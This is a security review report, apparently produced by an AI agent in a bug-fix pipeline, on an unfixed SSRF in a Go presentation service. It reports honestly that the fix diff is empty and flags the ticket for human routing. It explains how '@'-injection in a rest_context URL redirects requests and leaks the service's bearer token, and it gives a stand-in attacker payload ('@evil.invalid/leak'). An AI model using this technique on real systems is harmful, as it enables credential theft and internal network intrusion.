# PLTFRM-89912 — Security Review Report (Phase 09)

## Verdict: **FINDINGS**

## Executive summary

Phase 9 was invoked with **no fix diff** in the prompt
(`args.context.diff_text` rendered empty), no `bug_description`, and no
`06.5-impl-summary.json` artifact in `.bug-fix/PLTFRM-89912/`. The
active fix worktree (`fix/pltfrm-89912-011`) is at the same commit as
`devstory` head — its `presentation-service` submodule HEAD is
`00f13bc` ("refactor: switch standctl skill to append_file mode"),
which is unrelated to the SSRF and contains no edits to
`internal/app/handlers/{displayObjects.go,presentations.go}`. Phase 8
already returned `BLOCKED` for the same reason
(`08-code-review-report.md`).

Because the fix is *not implemented*, the vulnerable code paths on the
deployed `mc-clean-25134` image are unchanged and the original bug —
SSRF via `@`-injection in `rest_context.url`, plus upstream-context
info-disclosure in the 422 error response — remains exploitable
end-to-end with the credentials supplied
(`pltfrm-89912-001-user@test.local`). The reproduction artifact
`evidence/api/assertions/api-03-trigger-ssrf/` already shows this
working against this exact stand.

This is **not** a UI access-control fix — it is a backend SSRF whose
fix must land in `ASK/presentation-service`. The prompt's "API Attack
Surface Analysis" is therefore satisfied by inspecting the **backend
diff**, which is empty. There is no UI surface to test in lieu of a
backend fix; the entire attack surface is the `POST
/api/presentation/v1/display_objects` and `POST
/api/presentation/v1/presentations/{display_object_key}` HTTP path
that the bug already exploits.

A `FINDINGS` verdict is therefore the only honest outcome at the
IMPLEMENT-REVIEW checkpoint. The human reviewer should route back to
Fix Implementation (phase 6.5) so a real diff is produced before the
pipeline advances to build-and-deploy.

## API Attack Surface Analysis

### 1. API authorization boundary check

The reviewed diff is **empty**. There is no fix in this run to assess
for "UI-only" vs "backend-enforced" — there is no fix at all. The bug
itself, per the reproduction and the fix proposal, is purely a
**backend** server-side request forgery; it has no UI component. The
expected fix lives entirely in `ASK/presentation-service` Go code:
input validation in `displayObjects.go`, render-time validation +
`url.JoinPath` rewrite in `presentations.go::buildRestContext`, and
error scrubbing in the `getPresentation` caller. None of those edits
are present in `fix/pltfrm-89912-011`'s `presentation-service`
submodule.

### 2. Direct API exploitation (status: still vulnerable)

I did **not** re-run the live exploit against `mc-clean-25134` as
part of this review, because the reproduction phase already did so
and recorded its evidence at
`evidence/api/assertions/api-03-trigger-ssrf/`, with the buggy
behaviour observed on this exact stand. With an empty fix diff, no
code path on the deployed image has changed, so the exploit
*necessarily* still works — there is nothing to gate it behind.

The relevant endpoints, all reachable as
`pltfrm-89912-001-user@test.local`:

- `POST /api/presentation/v1/display_objects` — accepts
  `rest_context[].url = "@<attacker>/path"` with no validation
  beyond HTTP method (handler in `displayObjects.go::Post`,
  `verifyDORequestData` only checks `Method`).
- `POST /api/presentation/v1/presentations/{display_object_key}` —
  renders the stored display object via
  `buildRestContext`, which at `presentations.go:409` constructs the
  outbound URL by string-concatenation
  (`restContextURL + renderedURL`), so any `@` in `renderedURL`
  hijacks the `net/url` parse and dials the attacker.
- The 422 error path at `presentations.go:472-474` and the caller at
  `presentations.go:167-170` echo back the rendered URL, the
  upstream `body`, and `status_code` — i.e. an info-disclosure
  primitive layered on top of the SSRF.

### 3. Privilege escalation via API

With an empty fix diff, all three privilege-escalation vectors named
in the prompt remain exploitable:

- **GET-equivalent data leak via API:** the SSRF's response carries
  the upstream `body` back to the caller (info-disclosure), so an
  unauthenticated/low-privilege caller can read internal-service
  bodies they could not otherwise reach.
- **POST/PUT/DELETE via API:** the SSRF inherits the
  presentation-service's bearer token (passed via the
  `Authorization` header in `customRequest`), so the attacker can
  invoke any internal-service mutation that token authorises.
- **Related endpoints:** `display_objects` create / update /
  delete all use the same `verifyDORequestData` validator that
  today only checks `Method` — every code path that admits a
  `rest_context` map is equally vulnerable.

### 4. Verdict

`REJECTED — UI-only fix, API attack surface unaddressed` does not
apply, because there is no UI fix; there is no fix at all. The
correct verdict given the schema's `enum: [APPROVED, FINDINGS]`
constraint is **FINDINGS**. The single, dominant finding is "fix
not implemented" — every sub-finding (SSRF, info-disclosure, missing
input validation, missing render-time guard) is a downstream
consequence of that.

## Findings

### F-01 — Fix not implemented; pipeline received empty diff

- **Category:** Process / pipeline integrity (precondition for any
  security verdict)
- **Severity:** high
- **Description:**
  Phase 9 ran with `args.context.diff_text == ""` and
  `args.context.bug_description == ""`. The active fix worktree
  `fix/pltfrm-89912-011` matches `devstory` HEAD with no commits
  touching `presentation-service`. The expected
  `06.5-impl-summary.json` is missing from
  `.bug-fix/PLTFRM-89912/`. Approving an empty review here would
  silently advance the pipeline past a missing implementation.
- **Remediation:**
  Route back to phase 6.5 (Fix Implementation). Re-enter phase 9
  only after `06.5-impl-summary.json` exists and the fix branch's
  `presentation-service` submodule has commits touching
  `internal/app/handlers/displayObjects.go`,
  `internal/app/handlers/presentations.go`, and the corresponding
  test files named in `06-implementation-plan.md`.

### F-02 — SSRF via `@`-injection in `rest_context.url` (unfixed)

- **Category:** OWASP A10:2021 Server-Side Request Forgery
- **Severity:** critical
- **File:** `src/cyberstack/platform-presentation/internal/app/handlers/presentations.go`
- **Line range:** 385-482 (whole `buildRestContext`); specifically
  line 409 (`restContextURL+renderedURL`).
- **Description:**
  `buildRestContext` concatenates a user-controlled `rest_context[].url`
  onto a trusted internal-service base URL. When the user-supplied
  string starts with `@<attacker>/<path>`, the resulting
  `http://<svc>:<port>@<attacker>/<path>` parses as
  `userinfo@host`, so Go's `net/url` dials `<attacker>` and forwards
  the service's bearer token. Reachable as the supplied test user
  via `POST /api/presentation/v1/presentations/{display_object_key}`.
- **Remediation:**
  Apply the layered fix in `06-implementation-plan.md`:
  (a) create-time input validation in
  `displayObjects.go::verifyDORequestData` rejecting `@`, `%40`,
  `%2540`, absolute URLs, userinfo, and control characters in both
  `URL` and `URLVariables`;
  (b) render-time validation after `pongo2.RenderTemplateString` and
  again after `replaceURLVariables`, plus rebuilding the outbound
  URL with `url.Parse(restContextURL).JoinPath(renderedURL)` and
  asserting `.Host` and `.User` are unchanged after the join.

### F-03 — Verbose error response leaks attacker URL + upstream body / status (unfixed)

- **Category:** OWASP A04:2021 Insecure Design / Information Disclosure
- **Severity:** high
- **File:** `src/cyberstack/platform-presentation/internal/app/handlers/presentations.go`
- **Line range:** 167-170 (caller in `getPresentation`), 453
  (request-error fmt.Errorf), 472-474 (upstream-non-2xx path).
- **Description:**
  On upstream failure, the 422 response carries the
  attacker-supplied rendered URL fragment, the upstream HTTP
  `status_code`, and the decoded upstream `body` back to the
  caller. The caller in `getPresentation` further `%+v`-formats the
  inner error (which contains the rendered URL) into the user-visible
  message and sets the `restContext` map as the response `Context`
  field. This gives any authenticated caller a probing primitive
  for the internal network and a read primitive against arbitrary
  upstream bodies — a usable secondary attack even after the SSRF
  itself is closed.
- **Remediation:**
  In the upstream-non-2xx branch, return `nil` context map and a
  service-key-only `fmt.Errorf("REST context request failed for
  service %q", k)`; mirror the same in the request-error branch;
  log the full upstream URL/status/body server-side via
  `logger.Errorf`. In `getPresentation`, replace
  `api.NewUnprocessableEntityError(restContext, "REST context
  request failed: %+v", err)` with
  `api.NewUnprocessableEntityError(nil, "REST context request
  failed")`.

### F-04 — No input validation at create-time on `rest_context[].url` / `url_variables` (unfixed)

- **Category:** OWASP A03:2021 Injection / Improper Input Validation
- **Severity:** high
- **File:** `src/cyberstack/platform-presentation/internal/app/handlers/displayObjects.go`
- **Line range:** `verifyDORequestData` (and the GET-method check at
  `Post` lines 170-177) — no per-URL validation today.
- **Description:**
  `POST /api/presentation/v1/display_objects` admits an arbitrary
  `rest_context` array with the only validation being the HTTP
  method on each entry. A malicious display object with `url =
  "@evil.invalid/leak"` (or the same payload smuggled through
  `url_variables`) is persisted and is then weaponised at
  presentation render time (F-02). This means even if the
  render-time defence is added, stored display objects from before
  the validator can still trigger F-02; conversely, even if F-02 is
  fixed, a future call site that bypasses `buildRestContext` would
  still see malicious data in the store.
- **Remediation:**
  Add `validateRestContextURL(raw string) error` per the
  implementation plan and call it from `verifyDORequestData` for
  every `RestContext[i][svc].URL` and every value in
  `RestContext[i][svc].URLVariables`. Reject with `400 BadRequestError`
  on the first failure; do not echo the offending value back in
  the error message.

## Confidence

**95 / 100** that `FINDINGS` is the correct verdict.

The 5-point uncertainty is the unlikely possibility that the
implementation phase deliberately produced a no-op (e.g. the fix
landed on `master` of the `presentation-service` submodule between
phases 3 and 6.5). Even in that scenario the right move is to
surface the no-op via phase 6.5 — which can emit a structured
"already fixed" summary plus the actual upstream commit hash — rather
than silently approve an empty diff at phase 9. F-02 / F-03 / F-04
remain valid against the deployed `mc-clean-25134` image regardless,
since the reproduction was performed against that exact image.
